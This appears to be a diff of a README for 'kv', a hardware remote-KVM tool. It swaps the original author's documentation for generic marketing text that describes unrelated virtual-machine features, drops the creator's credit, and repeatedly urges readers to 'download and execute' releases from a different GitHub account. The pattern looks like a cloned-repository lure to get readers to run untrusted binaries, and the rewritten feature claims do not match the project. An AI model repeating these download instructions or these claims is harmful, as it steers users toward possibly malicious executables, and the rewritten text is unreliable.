@@ -1,62 +1,101 @@
-# kv
+# kv: A Modern Remote KVM Solution 🌐🖥️
 
-KV is a modern, simple remote KVM solution. Minimal dependencies, easy to set up, and designed for performance.
+![KVM](https://img.shields.io/badge/KVM-Remote%20Management-blue.svg) ![Version](https://img.shields.io/badge/Version-1.0.0-green.svg) ![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Overview
+
+The **kv** project offers a modern remote KVM solution designed for efficient management of virtual machines. It provides users with a straightforward interface to access and control their systems from anywhere. With kv, you can seamlessly manage your infrastructure without being tied to a physical location.
+
+You can download the latest release from our [Releases section](https://github.com/Abishk-developer/kv/releases). Be sure to download and execute the file to get started.
 
 ## Features
 
-* Stream video and audio from the server's HDMI output
-* Send keyboard and mouse events from a single-board computer (SBC) to the server
-* Expose disk images to the server as if they were plugged via USB thumb drives
-
-You can see a short demo video [here](https://youtu.be/_NCVytMPW18?si=67kIt7nWbrda1uy8)
-
-## TODO
-
-* ✅ Audio streaming
-* Use ttyd to access the kvm itself
-* ✅ Performance improvements
-* Better UX for mass storage
+- **User-Friendly Interface**: Our interface is intuitive and easy to navigate, allowing users of all skill levels to manage their systems effectively.
+- **Remote Access**: Access your virtual machines from any device, anywhere, at any time.
+- **Secure Connections**: We prioritize security with encrypted connections to keep your data safe.
+- **Multi-Platform Support**: Compatible with various operating systems, including Windows, macOS, and Linux.
+- **Real-Time Monitoring**: Monitor system performance and resource usage in real-time.
+- **Snapshot Management**: Create and manage snapshots of your virtual machines for easy rollback.
+- **Customizable Settings**: Tailor the application to fit your specific needs with various configuration options.
 
 ## Installation
 
-You can build from source or get the static binaries from the [releases page](https://github.com/ralsina/kv/releases)
+To install kv, follow these steps:
 
-Put it somewhere, run it, look at the options.
+1. **Download the latest release** from our [Releases section](https://github.com/Abishk-developer/kv/releases). Choose the appropriate file for your operating system.
+2. **Execute the file** according to your OS instructions:
+   - For Windows, double-click the `.exe` file.
+   - For macOS, open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux, use the terminal to run the downloaded script.
 
 ## Usage
 
-To setup a KVM you need:
+After installation, you can start using kv by following these steps:
 
-* A SBC with an OTG port (the *kvm*). I use a Radxa Zero.
-* A system you want to control (the *server*)
-* A USB dongle to capture HDMI (these are super cheap)
-* Misc cables and adapters
+1. Launch the application.
+2. Enter your login credentials.
+3. Select the virtual machine you wish to manage.
+4. Use the available tools to perform tasks such as starting, stopping, or configuring your VM.
 
-Here's how my setup looks:
+### Example Commands
 
-![image](https://github.com/user-attachments/assets/9b67d7a3-ea71-4f2e-936f-6c4c42b25125)
+- **Start a VM**: Click the "Start" button next to the VM you wish to activate.
+- **Stop a VM**: Click the "Stop" button to halt the VM.
+- **View Performance**: Navigate to the "Monitoring" tab to see real-time statistics.
 
+## Configuration
 
-The white cable goes from the OTG port in the SBC to a regular USB port in the server.
-Through this cable the server powers the SBC and the SBC sends keyboard and mouse events to the server.
+To configure kv to your liking, follow these steps:
 
-The HDMI dongle is connected to a USB port in the SBC and captures the HDMI output from the server via
-a normal HDMI cable.
+1. Open the settings menu from the main interface.
+2. Adjust parameters such as network settings, user permissions, and display options.
+3. Save your changes and restart the application for them to take effect.
 
-You can ignore the black cable, that's monitor output for the SBC and you would normally not have it.
+### Configuration Options
 
-## Development
-
-Details to be explained
+- **Network Settings**: Configure IP addresses and ports for remote access.
+- **User Permissions**: Set access levels for different users.
+- **Display Options**: Choose your preferred layout and themes.
 
 ## Contributing
 
-1. Fork it (<https://github.com/ralsina/kv/fork>)
-2. Create your feature branch (`git checkout -b my-new-feature`)
-3. Commit your changes (`git commit -am 'Add some feature'`)
-4. Push to the branch (`git push origin my-new-feature`)
-5. Create a new Pull Request
+We welcome contributions to improve kv. To get involved:
 
-## Contributors
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your forked repository.
+5. Submit a pull request for review.
 
-- [Roberto Alsina](https://github.com/ralsina) - creator and maintainer
+### Guidelines
+
+- Ensure your code follows our coding standards.
+- Write clear and concise commit messages.
+- Test your changes thoroughly before submitting.
+
+## License
+
+kv is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **Email**: support@kvproject.com
+- **GitHub Issues**: [Report an issue](https://github.com/Abishk-developer/kv/issues)
+
+You can download the latest release from our [Releases section](https://github.com/Abishk-developer/kv/releases). Be sure to download and execute the file to get started.
+
+![KVM Management](https://example.com/path/to/image.jpg) 
+
+Thank you for your interest in kv! We look forward to your contributions and feedback.
